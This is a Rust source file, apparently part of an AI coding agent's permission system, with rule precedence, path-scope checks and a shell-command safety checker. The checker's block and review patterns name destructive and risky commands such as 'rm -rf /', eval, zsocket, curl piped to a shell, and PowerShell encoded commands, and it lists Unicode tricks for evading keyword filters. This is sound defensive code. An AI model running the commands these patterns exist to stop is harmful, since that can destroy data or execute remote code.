use std::{
    fmt,
    path::{Path, PathBuf},
};

use serde::{Deserialize, Serialize};

/// User-facing permission modes planned for command and tool execution.
#[derive(Clone, Copy, Debug, Default, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum PermissionMode {
    /// Represents default
    #[default]
    Default,
    /// Represents accept edits
    AcceptEdits,
    /// Represents bypass permissions
    BypassPermissions,
    /// Represents dont ask
    DontAsk,
    /// Represents plan
    Plan,
}
/// Enumerates permission rule behavior
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionRuleBehavior {
    /// Represents allow
    Allow,
    /// Represents deny
    Deny,
    /// Represents ask
    Ask,
}

impl PermissionRuleBehavior {
    /// Constant fn
    #[must_use]
    pub const fn precedence(self) -> u8 {
        match self {
            Self::Deny => 0,
            Self::Ask => 1,
            Self::Allow => 2,
        }
    }
    /// Constant fn
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
            Self::Ask => "ask",
        }
    }
}
/// Enumerates permission rule source
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionRuleSource {
    /// Represents policy
    Policy,
    /// Represents cli arg
    CliArg,
    /// Represents session runtime
    SessionRuntime,
    /// Represents command
    Command,
    /// Represents local
    Local,
    /// Represents project
    Project,
    /// Represents user
    User,
}

impl PermissionRuleSource {
    /// Lower values are stronger. Policy is never weakened by lower-precedence
    /// sources, while session/CLI overrides remain stronger than persisted user
    /// settings.
    #[must_use]
    pub const fn precedence(self) -> u8 {
        match self {
            Self::Policy => 0,
            Self::CliArg => 1,
            Self::SessionRuntime => 2,
            Self::Command => 3,
            Self::Local => 4,
            Self::Project => 5,
            Self::User => 6,
        }
    }
    /// Constant fn
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Policy => "policy",
            Self::CliArg => "cli_arg",
            Self::SessionRuntime => "session_runtime",
            Self::Command => "command",
            Self::Local => "local",
            Self::Project => "project",
            Self::User => "user",
        }
    }
}
/// Enumerates permission rule constraint
#[derive(Clone, Debug, Default, Eq, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum PermissionRuleConstraint {
    /// Represents any
    #[default]
    Any,
    /// Represents path prefix
    PathPrefix {
        /// Stores the path
        path: PathBuf,
    },
    /// Represents shell command contains
    ShellCommandContains {
        /// Stores the text
        text: String,
    },
}
/// Represents permission rule
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct PermissionRule {
    /// Stores the tool
    pub tool: String,
    /// Stores the behavior
    pub behavior: PermissionRuleBehavior,
    /// Stores the source
    pub source: PermissionRuleSource,
    /// Stores the constraint
    #[serde(default)]
    pub constraint: PermissionRuleConstraint,
    /// Stores the reason
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
}

impl PermissionRule {
    /// Creates a new value
    #[must_use]
    pub fn new(
        tool: impl Into<String>,
        behavior: PermissionRuleBehavior,
        source: PermissionRuleSource,
    ) -> Self {
        Self {
            tool: tool.into(),
            behavior,
            source,
            constraint: PermissionRuleConstraint::Any,
            reason: None,
        }
    }
    /// Handles for path prefix
    #[must_use]
    pub fn for_path_prefix(mut self, path: impl Into<PathBuf>) -> Self {
        self.constraint = PermissionRuleConstraint::PathPrefix { path: path.into() };
        self
    }
    /// Handles for shell command
    #[must_use]
    pub fn for_shell_command(mut self, text: impl Into<String>) -> Self {
        self.constraint = PermissionRuleConstraint::ShellCommandContains { text: text.into() };
        self
    }
    /// Handles with reason
    #[must_use]
    pub fn with_reason(mut self, reason: impl Into<String>) -> Self {
        self.reason = Some(reason.into());
        self
    }
    /// Handles matches
    #[must_use]
    pub fn matches(&self, context: &ToolPermissionContext, request: &PermissionRequest) -> bool {
        let tool = normalize_tool_name(&self.tool);
        if tool.as_deref() != Some("*") && !request.matches_tool_name(&self.tool) {
            return false;
        }

        match &self.constraint {
            PermissionRuleConstraint::Any => true,
            PermissionRuleConstraint::PathPrefix { path } => {
                if request.paths.is_empty() {
                    return false;
                }
                let prefix = canonicalize_best_effort(&context.resolve_path(path));
                request
                    .paths
                    .iter()
                    .map(|path| canonicalize_best_effort(&context.resolve_path(path)))
                    .all(|path| is_path_within(&path, &prefix))
            }
            PermissionRuleConstraint::ShellCommandContains { text } => request
                .shell_command
                .as_deref()
                .is_some_and(|command| command.contains(text)),
        }
    }
}
/// Represents additional working directory
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct AdditionalWorkingDirectory {
    /// Stores the path
    pub path: PathBuf,
    /// Stores the source
    pub source: PermissionRuleSource,
}

impl AdditionalWorkingDirectory {
    /// Creates a new value
    #[must_use]
    pub fn new(path: impl Into<PathBuf>, source: PermissionRuleSource) -> Self {
        Self {
            path: path.into(),
            source,
        }
    }
}
/// Represents tool permission context
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct ToolPermissionContext {
    /// Stores the cwd
    pub cwd: PathBuf,
    /// Stores the mode
    pub mode: PermissionMode,
    /// Stores the additional working directories
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub additional_working_directories: Vec<AdditionalWorkingDirectory>,
    /// Stores the rules
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rules: Vec<PermissionRule>,
}

impl ToolPermissionContext {
    /// Creates a new value
    #[must_use]
    pub fn new(cwd: impl Into<PathBuf>, mode: PermissionMode) -> Self {
        Self {
            cwd: cwd.into(),
            mode,
            additional_working_directories: Vec::new(),
            rules: Vec::new(),
        }
    }
    /// Handles with rule
    #[must_use]
    pub fn with_rule(mut self, rule: PermissionRule) -> Self {
        self.rules.push(rule);
        self
    }
    /// Handles with additional directory
    #[must_use]
    pub fn with_additional_directory(
        mut self,
        path: impl Into<PathBuf>,
        source: PermissionRuleSource,
    ) -> Self {
        self.additional_working_directories
            .push(AdditionalWorkingDirectory::new(path, source));
        self
    }
    /// Handles working directories
    #[must_use]
    pub fn working_directories(&self) -> Vec<PathBuf> {
        std::iter::once(canonicalize_best_effort(&self.resolve_path(&self.cwd)))
            .chain(
                self.additional_working_directories
                    .iter()
                    .map(|directory| canonicalize_best_effort(&self.resolve_path(&directory.path))),
            )
            .collect()
    }
    /// Resolves path
    #[must_use]
    pub fn resolve_path(&self, path: impl AsRef<Path>) -> PathBuf {
        resolve_path(path.as_ref(), &self.cwd)
    }
    /// Handles path in scope
    #[must_use]
    pub fn path_in_scope(&self, path: impl AsRef<Path>) -> bool {
        let resolved = canonicalize_best_effort(&self.resolve_path(path));
        self.working_directories()
            .into_iter()
            .any(|scope| is_path_within(&resolved, &scope))
    }
    /// Handles first path outside scope
    #[must_use]
    pub fn first_path_outside_scope(&self, paths: &[PathBuf]) -> Option<PathBuf> {
        paths
            .iter()
            .map(|path| canonicalize_best_effort(&self.resolve_path(path)))
            .find(|path| !self.path_in_scope(path))
    }

    #[must_use]
    fn first_path_escape_attempt(&self, paths: &[PathBuf]) -> Option<PathBuf> {
        let scopes = self.working_directories();
        let raw_scopes = std::iter::once(self.resolve_path(&self.cwd))
            .chain(
                self.additional_working_directories
                    .iter()
                    .map(|directory| self.resolve_path(&directory.path)),
            )
            .collect::<Vec<_>>();
        paths.iter().find_map(|path| {
            let resolved = self.resolve_path(path);
            let canonical = canonicalize_best_effort(&resolved);
            let canonical_outside = scopes
                .iter()
                .all(|scope| !is_path_within(&canonical, scope));
            if contains_parent_dir(path) && canonical_outside {
                return Some(canonical);
            }

            let raw_inside = raw_scopes
                .iter()
                .chain(scopes.iter())
                .any(|scope| is_path_within(&resolved, scope));
            (raw_inside && canonical_outside).then_some(canonical)
        })
    }
    /// Handles evaluate
    #[must_use]
    pub fn evaluate(&self, request: &PermissionRequest) -> PermissionDecision {
        evaluate_permission(self, request)
    }
}
/// Represents permission request
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct PermissionRequest {
    /// Stores the tool name
    pub tool_name: String,
    /// Stores the tool aliases
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tool_aliases: Vec<String>,
    /// Stores the read only
    #[serde(default)]
    pub read_only: bool,
    /// Stores the destructive
    #[serde(default)]
    pub destructive: bool,
    /// Stores the paths
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub paths: Vec<PathBuf>,
    /// Stores the shell command
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub shell_command: Option<String>,
}

impl PermissionRequest {
    /// Creates a new value
    #[must_use]
    pub fn new(tool_name: impl Into<String>) -> Self {
        Self {
            tool_name: tool_name.into(),
            tool_aliases: Vec::new(),
            read_only: false,
            destructive: false,
            paths: Vec::new(),
            shell_command: None,
        }
    }
    /// Handles with alias
    #[must_use]
    pub fn with_alias(mut self, alias: impl Into<String>) -> Self {
        self.tool_aliases.push(alias.into());
        self
    }
    /// Handles with aliases
    #[must_use]
    pub fn with_aliases(mut self, aliases: impl IntoIterator<Item = impl Into<String>>) -> Self {
        self.tool_aliases
            .extend(aliases.into_iter().map(Into::into));
        self
    }
    /// Reads only
    #[must_use]
    pub fn read_only(mut self, read_only: bool) -> Self {
        self.read_only = read_only;
        self
    }
    /// Handles destructive
    #[must_use]
    pub fn destructive(mut self, destructive: bool) -> Self {
        self.destructive = destructive;
        self
    }
    /// Handles with path
    #[must_use]
    pub fn with_path(mut self, path: impl Into<PathBuf>) -> Self {
        self.paths.push(path.into());
        self
    }
    /// Handles with paths
    #[must_use]
    pub fn with_paths(mut self, paths: impl IntoIterator<Item = impl Into<PathBuf>>) -> Self {
        self.paths.extend(paths.into_iter().map(Into::into));
        self
    }
    /// Handles with shell command
    #[must_use]
    pub fn with_shell_command(mut self, shell_command: impl Into<String>) -> Self {
        self.shell_command = Some(shell_command.into());
        self
    }
    /// Handles matches tool name
    #[must_use]
    pub fn matches_tool_name(&self, name: &str) -> bool {
        let Some(name) = normalize_tool_name(name) else {
            return false;
        };

        normalize_tool_name(&self.tool_name).as_deref() == Some(name.as_str())
            || self
                .tool_aliases
                .iter()
                .filter_map(|alias| normalize_tool_name(alias))
                .any(|alias| alias == name)
    }
}
/// Enumerates shell safety verdict
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub enum ShellSafetyVerdict {
    /// Represents review
    Review,
    /// Represents blocked
    Blocked,
}
/// Represents shell safety issue
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct ShellSafetyIssue {
    /// Stores the verdict
    pub verdict: ShellSafetyVerdict,
    /// Stores the message
    pub message: String,
}
/// Enumerates permission decision reason
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum PermissionDecisionReason {
    /// Represents rule
    Rule {
        /// Stores the rule
        rule: PermissionRule,
    },
    /// Represents mode
    Mode {
        /// Stores the mode
        mode: PermissionMode,
        /// Stores the detail
        detail: String,
    },
    /// Represents path scope
    PathScope {
        /// Stores the path
        path: PathBuf,
        /// Stores the allowed roots
        allowed_roots: Vec<PathBuf>,
    },
    /// Represents shell safety
    ShellSafety {
        /// Stores the issue
        issue: ShellSafetyIssue,
    },
}

impl fmt::Display for PermissionDecisionReason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Rule { rule } => {
                write!(
                    f,
                    "matched {} rule from {} for {}",
                    rule.behavior.label(),
                    rule.source.label(),
                    rule.tool
                )?;
                match &rule.constraint {
                    PermissionRuleConstraint::Any => {}
                    PermissionRuleConstraint::PathPrefix { path } => {
                        write!(f, " on path prefix {}", path.display())?;
                    }
                    PermissionRuleConstraint::ShellCommandContains { text } => {
                        write!(f, " on shell text {text:?}")?;
                    }
                }
                if let Some(reason) = &rule.reason {
                    write!(f, " ({reason})")?;
                }
                Ok(())
            }
            Self::Mode { mode, detail } => {
                write!(f, "{mode:?}: {detail}")
            }
            Self::PathScope {
                path,
                allowed_roots,
            } => {
                write!(
                    f,
                    "path {} is outside the working directories: {}",
                    path.display(),
                    allowed_roots
                        .iter()
                        .map(|path| path.display().to_string())
                        .collect::<Vec<_>>()
                        .join(", ")
                )
            }
            Self::ShellSafety { issue } => write!(f, "{}", issue.message),
        }
    }
}
/// Enumerates permission decision
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
#[serde(tag = "decision", rename_all = "snake_case")]
pub enum PermissionDecision {
    /// Represents allow
    Allow {
        /// Stores the reason
        reason: PermissionDecisionReason,
    },
    /// Represents ask
    Ask {
        /// Stores the reason
        reason: PermissionDecisionReason,
    },
    /// Represents deny
    Deny {
        /// Stores the reason
        reason: PermissionDecisionReason,
    },
}

impl PermissionDecision {
    /// Handles allow
    #[must_use]
    pub fn allow(reason: PermissionDecisionReason) -> Self {
        Self::Allow { reason }
    }
    /// Handles ask
    #[must_use]
    pub fn ask(reason: PermissionDecisionReason) -> Self {
        Self::Ask { reason }
    }
    /// Handles deny
    #[must_use]
    pub fn deny(reason: PermissionDecisionReason) -> Self {
        Self::Deny { reason }
    }
    /// Returns whether allowed
    #[must_use]
    pub fn is_allowed(&self) -> bool {
        matches!(self, Self::Allow { .. })
    }
    /// Handles reason
    #[must_use]
    pub fn reason(&self) -> &PermissionDecisionReason {
        match self {
            Self::Allow { reason } | Self::Ask { reason } | Self::Deny { reason } => reason,
        }
    }
}
/// Evaluates permission
#[must_use]
pub fn evaluate_permission(
    context: &ToolPermissionContext,
    request: &PermissionRequest,
) -> PermissionDecision {
    let matched_rule = resolve_matching_rule(context, request);

    if let Some(rule) = matched_rule
        .as_ref()
        .filter(|rule| rule.behavior == PermissionRuleBehavior::Deny)
    {
        return PermissionDecision::deny(PermissionDecisionReason::Rule { rule: rule.clone() });
    }

    if let Some(issue) = request
        .shell_command
        .as_deref()
        .and_then(|command| check_shell_safety_for_request(request, command))
        .filter(|issue| issue.verdict == ShellSafetyVerdict::Blocked)
    {
        return PermissionDecision::deny(PermissionDecisionReason::ShellSafety { issue });
    }

    if let Some(rule) = matched_rule
        .as_ref()
        .filter(|rule| rule.behavior == PermissionRuleBehavior::Allow)
    {
        return PermissionDecision::allow(PermissionDecisionReason::Rule { rule: rule.clone() });
    }

    if context.mode != PermissionMode::BypassPermissions {
        if let Some(path) = context.first_path_escape_attempt(&request.paths) {
            return PermissionDecision::deny(PermissionDecisionReason::PathScope {
                path,
                allowed_roots: context.working_directories(),
            });
        }
    }

    if let Some(path) = context.first_path_outside_scope(&request.paths) {
        return review_decision(
            context.mode,
            request.read_only,
            PermissionDecisionReason::PathScope {
                path,
                allowed_roots: context.working_directories(),
            },
        );
    }

    if let Some(issue) = request
        .shell_command
        .as_deref()
        .and_then(|command| check_shell_safety_for_request(request, command))
        .filter(|issue| issue.verdict == ShellSafetyVerdict::Review)
    {
        return review_decision(
            context.mode,
            request.read_only,
            PermissionDecisionReason::ShellSafety { issue },
        );
    }

    if let Some(rule) = matched_rule
        .as_ref()
        .filter(|rule| rule.behavior == PermissionRuleBehavior::Ask)
    {
        return PermissionDecision::ask(PermissionDecisionReason::Rule { rule: rule.clone() });
    }

    context
        .mode
        .default_decision(request.read_only, request.destructive)
}
/// Checks shell safety
///
/// Returns `None` when the command passes all checks.  Returns a
/// [`ShellSafetyIssue`] with verdict [`ShellSafetyVerdict::Blocked`] for
/// patterns that are unconditionally denied, and
/// [`ShellSafetyVerdict::Review`] for patterns that warrant human review.
///
/// Detection covers both the normalised token stream and select raw-string
/// patterns that must be caught before normalisation collapses syntax
/// (e.g. process substitution `<(…)` / `>(…)`, zsh `zmodload`/`zsocket`,
/// and backtick/command-substitution obfuscation of dangerous built-ins).
#[must_use]
pub fn check_shell_safety(command: &str) -> Option<ShellSafetyIssue> {
    // ── Pre-normalisation checks on the raw command ───────────────────────────
    //
    // Some patterns must be detected before `normalize_shell_command` collapses
    // them (parentheses become spaces, so `<(cmd)` would lose its `<(` shape).

    // Process substitution <(...) / >(...) opens a subshell connected to a
    // file-descriptor.  Uncommon in everyday scripts; always warrants review.
    if has_process_substitution(command) {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command uses process substitution (<(…) or >(…)) which requires review"
                .into(),
        });
    }

    let normalized = normalize_shell_command(command);

    // ── Blocked patterns ─────────────────────────────────────────────────────

    if normalized.contains("rm -rf /") || normalized.contains("rm -fr /") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command is denied because it attempts to remove the filesystem root"
                .into(),
        });
    }
    if normalized.contains("@p}") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command uses disallowed ${var@P}-style expansion".into(),
        });
    }
    if normalized.contains("${!") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command uses disallowed indirect parameter expansion".into(),
        });
    }
    if contains_shell_token(&normalized, "eval") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command uses eval-style dynamic execution".into(),
        });
    }
    // Detect `exec` used as a standalone shell built-in to replace the current
    // process, which can be used to execute arbitrary commands.
    if contains_shell_token(&normalized, "exec") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command uses exec to replace the shell process".into(),
        });
    }
    // Detect `source` / `.` used to execute a script in the current shell
    // environment, which bypasses normal sandboxing.  The bare `.` token is
    // very common as a path component, so only block when it is the *first*
    // command token.
    {
        let first_token = shell_tokens(&normalized).into_iter().next();
        if first_token.is_some_and(|t| t == "source" || t == ".") {
            return Some(ShellSafetyIssue {
                verdict: ShellSafetyVerdict::Blocked,
                message: "shell command sources a script into the current shell environment".into(),
            });
        }
    }
    // zsh's `zmodload` can load network, cryptography, and filesystem modules
    // that expose low-level capabilities not available in a standard shell.
    if contains_shell_token(&normalized, "zmodload") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command uses zmodload to load zsh modules, which can enable dangerous capabilities".into(),
        });
    }
    // `zsocket` (from zsh/net/tcp) opens raw TCP/UDP connections, bypassing
    // normal I/O sandboxing.
    if contains_shell_token(&normalized, "zsocket") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Blocked,
            message: "shell command uses zsocket for raw network socket access".into(),
        });
    }

    // ── Review patterns ───────────────────────────────────────────────────────

    if normalized.contains("rm -rf") || normalized.contains("rm -fr") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it removes files recursively".into(),
        });
    }
    if pipes_into_shell(&normalized) {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it pipes output into a shell".into(),
        });
    }
    if contains_shell_token(&normalized, "sudo") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it escalates privileges".into(),
        });
    }
    if shell_tokens(&normalized)
        .into_iter()
        .any(|token| token == "mkfs" || token.starts_with("mkfs."))
    {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it can reformat a device".into(),
        });
    }
    if normalized.contains("dd if=") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it can overwrite raw devices".into(),
        });
    }
    // `chmod` on system paths or with recursive flag warrants review.
    if contains_shell_token(&normalized, "chmod")
        && (normalized.contains(" -r")
            || normalized.contains("/etc/")
            || normalized.contains("/usr/"))
    {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it changes permissions recursively or on system paths".into(),
        });
    }
    // `chown` on system paths warrants review.
    if contains_shell_token(&normalized, "chown")
        && (normalized.contains("/etc/") || normalized.contains("/usr/"))
    {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it changes ownership on system paths"
                .into(),
        });
    }
    // Downloading and directly executing content is a classic supply-chain risk.
    if downloads_and_executes(&normalized) {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message:
                "shell command requires review because it downloads and executes remote content"
                    .into(),
        });
    }
    // `crontab -r` silently removes all cron jobs.
    if normalized.contains("crontab") && normalized.contains("-r") {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "shell command requires review because it removes all cron jobs".into(),
        });
    }

    None
}

fn check_shell_safety_for_request(
    request: &PermissionRequest,
    command: &str,
) -> Option<ShellSafetyIssue> {
    if request.matches_tool_name("powershell")
        && let Some(issue) = check_powershell_safety(command)
    {
        return Some(issue);
    }

    check_shell_safety(command)
}

fn check_powershell_safety(command: &str) -> Option<ShellSafetyIssue> {
    let normalized = normalize_shell_command(command);
    let tokens = shell_tokens(&normalized);

    if tokens.iter().any(|token| {
        matches!(*token, "-enc" | "-encodedcommand")
            || token.starts_with("-enc:")
            || token.starts_with("-encodedcommand:")
    }) {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "PowerShell command requires review because it uses encoded parameters".into(),
        });
    }

    let start_process = tokens.contains(&"start-process");
    let run_as = tokens
        .windows(2)
        .any(|pair| pair[0] == "-verb" && pair[1] == "runas")
        || tokens.iter().any(|token| token.starts_with("-verb:runas"));
    if start_process && run_as {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message: "PowerShell command requires review because it requests elevated execution"
                .into(),
        });
    }

    if tokens
        .iter()
        .any(|token| matches!(*token, "invoke-expression" | "iex"))
    {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message:
                "PowerShell command requires review because it executes dynamic PowerShell code"
                    .into(),
        });
    }

    if tokens.first().is_some_and(|token| {
        matches!(
            *token,
            "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
        )
    }) {
        return Some(ShellSafetyIssue {
            verdict: ShellSafetyVerdict::Review,
            message:
                "PowerShell command requires review because it spawns a nested PowerShell process"
                    .into(),
        });
    }

    None
}

/// Normalises a shell command for pattern matching.
///
/// The following transformations are applied in order:
///
/// 1. **Zero-width / directional-override characters** are removed.  These
///    Unicode code-points are invisible to humans but can split tokens to
///    bypass keyword detection (e.g. `ev\u{200B}al` → `eval`).
/// 2. **`#` comments** are stripped: a `#` that follows whitespace (or starts
///    the string) begins a comment that runs to the next newline.  This keeps
///    the check focused on the executable portion of each line.
/// 3. **Backticks** are converted to spaces.  Backtick command-substitution
///    (`` `cmd` ``) uses the same `\`…\`` delimiter for both open and close,
///    so without this step the first word after the opening backtick is never
///    a clean shell token (e.g. `` `eval `` ≠ `eval`).
/// 4. **Typographic dashes** (en/em) are normalised to ASCII `-`.
/// 5. **Shell meta-characters** (`;`, `&`, `(`, `)`) are replaced with spaces
///    so they act as token separators without entering the token stream.
/// 6. All remaining characters are **lowercased** and consecutive whitespace
///    is **collapsed** to a single space.
fn normalize_shell_command(command: &str) -> String {
    let mut normalized = String::with_capacity(command.len());
    let mut saw_whitespace = false;
    let mut in_comment = false;

    for ch in command.chars() {
        // Step 1 – drop zero-width and directional-override code-points.
        if is_zero_width_or_override(ch) {
            continue;
        }

        // Step 2 – handle `#` comment stripping and newline comment reset.
        if ch == '\n' || ch == '\r' {
            // Newline always ends a comment; treat it as whitespace.
            in_comment = false;
        } else if in_comment {
            continue;
        } else if ch == '#' && (normalized.is_empty() || saw_whitespace) {
            // `#` after whitespace (or at the very start) opens a comment.
            in_comment = true;
            continue;
        }

        // Steps 3-5 – character-level substitutions.
        let ch = match ch {
            '\u{2013}' | '\u{2014}' | '\u{2015}' => '-',
            ';' | '&' | '(' | ')' | '`' => ' ',
            _ => ch.to_ascii_lowercase(),
        };

        if ch.is_whitespace() {
            if !saw_whitespace {
                normalized.push(' ');
                saw_whitespace = true;
            }
            continue;
        }

        normalized.push(ch);
        saw_whitespace = false;
    }

    normalized.trim().to_string()
}

/// Returns `true` for Unicode code-points that are invisible / zero-width or
/// that can override text direction — all of which could be used to visually
/// hide or split dangerous tokens.
fn is_zero_width_or_override(ch: char) -> bool {
    matches!(
        ch,
        '\u{200B}' // ZERO WIDTH SPACE
        | '\u{200C}' // ZERO WIDTH NON-JOINER
        | '\u{200D}' // ZERO WIDTH JOINER
        | '\u{FEFF}' // BOM / ZERO WIDTH NO-BREAK SPACE
        | '\u{2060}' // WORD JOINER
        | '\u{200E}' // LEFT-TO-RIGHT MARK
        | '\u{200F}' // RIGHT-TO-LEFT MARK
        | '\u{202A}' // LEFT-TO-RIGHT EMBEDDING
        | '\u{202B}' // RIGHT-TO-LEFT EMBEDDING
        | '\u{202C}' // POP DIRECTIONAL FORMATTING
        | '\u{202D}' // LEFT-TO-RIGHT OVERRIDE
        | '\u{202E}' // RIGHT-TO-LEFT OVERRIDE
    )
}

/// Returns `true` when the raw command contains a bash/zsh process
/// substitution operator (`<(…)` or `>(…)`).
///
/// This check must run on the *raw* command because normalisation converts `(`
/// to a space, destroying the recognisable `<(`/`>(` shape.
fn has_process_substitution(command: &str) -> bool {
    let bytes = command.as_bytes();
    bytes
        .windows(2)
        .any(|w| (w[0] == b'<' || w[0] == b'>') && w[1] == b'(')
}

fn shell_tokens(command: &str) -> Vec<&str> {
    command
        .split(|ch: char| ch.is_whitespace() || matches!(ch, '|' | '<' | '>'))
        .filter(|token| !token.is_empty())
        .collect()
}

fn contains_shell_token(command: &str, token: &str) -> bool {
    shell_tokens(command).into_iter().any(|part| part == token)
}

/// Returns `true` when the command downloads remote content and immediately
/// pipes or redirects it for execution (e.g. `curl … | bash` or
/// `wget -O- … | sh`).
fn downloads_and_executes(command: &str) -> bool {
    let downloader_tokens = ["curl", "wget", "fetch"];
    let executor_tokens = [
        "sh", "bash", "dash", "ksh", "zsh", "python", "python3", "ruby", "perl", "node",
    ];

    // Must contain a pipe and both a downloader and an executor.
    if !command.contains('|') {
        return false;
    }
    let tokens = shell_tokens(command);
    let has_downloader = tokens.iter().any(|t| downloader_tokens.contains(t));
    let has_executor = tokens.iter().any(|t| executor_tokens.contains(t));
    has_downloader && has_executor
}

fn pipes_into_shell(command: &str) -> bool {
    let mut segments = command.split('|').map(str::trim);
    let Some(_) = segments.next() else {
        return false;
    };

    segments.any(|segment| {
        shell_tokens(segment)
            .first()
            .is_some_and(|token| matches!(*token, "sh" | "bash" | "dash" | "ksh" | "zsh"))
    })
}
/// Resolves path
#[must_use]
pub fn resolve_path(path: &Path, cwd: &Path) -> PathBuf {
    let absolute = if path.is_absolute() {
        path.to_path_buf()
    } else {
        cwd.join(path)
    };
    normalize_path(&absolute)
}
/// Returns whether path within
#[must_use]
pub fn is_path_within(path: &Path, root: &Path) -> bool {
    let path = normalize_path(path);
    let root = normalize_path(root);
    path == root || path.starts_with(&root)
}

fn review_decision(
    mode: PermissionMode,
    read_only: bool,
    reason: PermissionDecisionReason,
) -> PermissionDecision {
    match mode {
        PermissionMode::BypassPermissions => PermissionDecision::allow(reason),
        PermissionMode::DontAsk => PermissionDecision::deny(reason),
        PermissionMode::Plan if !read_only => PermissionDecision::deny(reason),
        _ => PermissionDecision::ask(reason),
    }
}

fn resolve_matching_rule(
    context: &ToolPermissionContext,
    request: &PermissionRequest,
) -> Option<PermissionRule> {
    context
        .rules
        .iter()
        .enumerate()
        .filter(|(_, rule)| rule.matches(context, request))
        .min_by_key(|(index, rule)| (rule.source.precedence(), rule.behavior.precedence(), *index))
        .map(|(_, rule)| rule.clone())
}

fn normalize_tool_name(name: &str) -> Option<String> {
    let normalized = name.trim().trim_start_matches('/').to_ascii_lowercase();
    (!normalized.is_empty()).then_some(normalized)
}

fn normalize_path(path: &Path) -> PathBuf {
    let mut normalized = PathBuf::new();
    let mut absolute = false;

    for component in path.components() {
        match component {
            std::path::Component::Prefix(prefix) => normalized.push(prefix.as_os_str()),
            std::path::Component::RootDir => {
                absolute = true;
                normalized.push(component.as_os_str());
            }
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                if !normalized.pop() && !absolute {
                    normalized.push(component.as_os_str());
                }
            }
            std::path::Component::Normal(part) => normalized.push(part),
        }
    }

    if normalized.as_os_str().is_empty() {
        if absolute {
            PathBuf::from(std::path::MAIN_SEPARATOR.to_string())
        } else {
            PathBuf::from(".")
        }
    } else {
        normalized
    }
}

fn canonicalize_best_effort(path: &Path) -> PathBuf {
    let normalized = normalize_path(path);
    if let Ok(canonical) = std::fs::canonicalize(&normalized) {
        return normalize_path(&canonical);
    }

    let mut missing = Vec::new();
    let mut existing = normalized.as_path();
    while !existing.exists() {
        let Some(parent) = existing.parent() else {
            return normalized;
        };
        if let Some(name) = existing.file_name() {
            missing.push(name.to_os_string());
        }
        existing = parent;
    }

    let Ok(mut canonical) = std::fs::canonicalize(existing) else {
        return normalized;
    };
    for part in missing.iter().rev() {
        canonical.push(part);
    }
    normalize_path(&canonical)
}

fn contains_parent_dir(path: &Path) -> bool {
    path.components()
        .any(|component| matches!(component, std::path::Component::ParentDir))
}

impl PermissionMode {
    /// Conservative defaults before UI prompting, hooks, and per-tool safety
    /// handlers exist.
    #[must_use]
    pub fn default_decision(self, read_only: bool, destructive: bool) -> PermissionDecision {
        match self {
            Self::BypassPermissions => PermissionDecision::allow(PermissionDecisionReason::Mode {
                mode: self,
                detail: "bypass permission mode".into(),
            }),
            Self::DontAsk => PermissionDecision::deny(PermissionDecisionReason::Mode {
                mode: self,
                detail: "dontAsk mode denies actions requiring confirmation".into(),
            }),
            Self::Plan if !read_only => PermissionDecision::deny(PermissionDecisionReason::Mode {
                mode: self,
                detail: "plan mode allows read-only actions only".into(),
